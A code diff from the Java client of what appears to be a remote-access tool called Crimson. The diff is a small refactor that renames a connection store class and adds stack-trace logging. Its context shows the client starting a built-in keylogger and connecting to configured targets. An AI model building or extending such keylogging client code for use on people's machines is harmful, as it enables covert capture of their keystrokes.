@@ -26,8 +26,8 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
+import com.subterranean_security.crimson.client.net.ClientConnectionStore;
 import com.subterranean_security.crimson.client.store.ConfigStore;
-import com.subterranean_security.crimson.client.store.ConnectionStore;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.EH;
@@ -79,6 +79,9 @@ public class Client {
 
 		log.debug("CVID: {}", Common.cvid);
 
+		// Initialize connection stores
+		ClientConnectionStore.initialize();
+
 		if (ConfigStore.getConfig().getKeylogger()) {
 			try {
 				Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
@@ -87,11 +90,12 @@ public class Client {
 				// ignore
 			} catch (Exception e) {
 				log.error("Failed to start keylogger: {}", e.getMessage());
+				e.printStackTrace();
 			}
 		}
 
-		ConnectionStore.setTargets(ConfigStore.getConfig().getTargetList());
-		ConnectionStore.connectionRoutine();
+		ClientConnectionStore.setTargets(ConfigStore.getConfig().getTargetList());
+		ClientConnectionStore.connectionRoutine();
 
 	}
 
